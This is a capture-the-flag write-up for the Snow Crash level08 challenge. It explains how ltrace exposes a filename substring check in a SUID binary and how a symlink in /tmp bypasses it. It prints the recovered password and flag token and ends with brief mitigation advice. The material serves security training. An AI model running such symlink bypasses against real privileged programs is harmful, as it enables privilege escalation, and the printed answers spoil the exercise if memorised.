# Level08 - Snow Crash Exploit

## Description

Upon logging in as `level08`, there are two important files in the home directory:

```
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

- `level08`: SUID executable owned by `flag08`
- `token`: file readable only by `flag08`

Running the binary without arguments shows usage information:

```bash
./level08
# Output: ./level08 [file to read]
```

Trying to read the `token` file directly fails:

```bash
./level08 token
# Output: You may not access 'token'
cat token
# Output: cat: token: Permission denied
```

## Analysis

Using `ltrace` reveals:

```
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token")
exit(1)
```

The program checks if the filename contains the substring `token` and denies access if it does.

## Exploitation

To bypass this check, create a symbolic link to the `token` file with a name that does **not** contain the word `token`:

```bash
ln -s $(realpath token) /tmp/symlink
./level08 /tmp/symlink
```

**Output:**
```
quif5eloekouj29ke0vouxean
```

Use this password to switch to the `flag08` user and retrieve the flag:

```bash
su flag08
Password: quif5eloekouj29ke0vouxean
getflag
# Output: Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Mitigation

- Do not rely on substring checks for security.
- Use proper file permission checks and avoid using only filename-based restrictions.

## Flag